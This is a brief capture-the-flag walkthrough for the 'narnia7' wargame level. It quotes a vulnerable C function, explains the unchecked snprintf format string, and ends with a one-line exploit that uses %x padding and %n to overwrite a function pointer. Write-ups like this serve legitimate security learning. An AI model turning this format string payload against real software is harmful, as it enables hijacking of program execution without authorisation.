# narnia7
The objective of this challenge is to change the function pointer ptrf() to
point to hackedfunction() instead of goodfunction().

This is accomplished with a format string exploit.

## Notes

Source code for the vulnerable function, vuln():
```*.c
int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}
```

A buffer of size 128 is declared and zeroed out with ```memset```. The
exploitable ```snprinf``` function is called, so I know this is a format string
exploit.

The function prints:
```
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd5c8)
```

## Solution
The vulnerability is in the snprintf() function. We can use a format string
attack to exploit it.

The address of goodfunction() and hackedfunction() are printed. The value of
0x8048724 is 134514468.


Enter the following exploit:

```bash
/narnia/narnia7 $(python -c "print '\x38\xd6\xff\xff' + '%134514468x%n'")
```
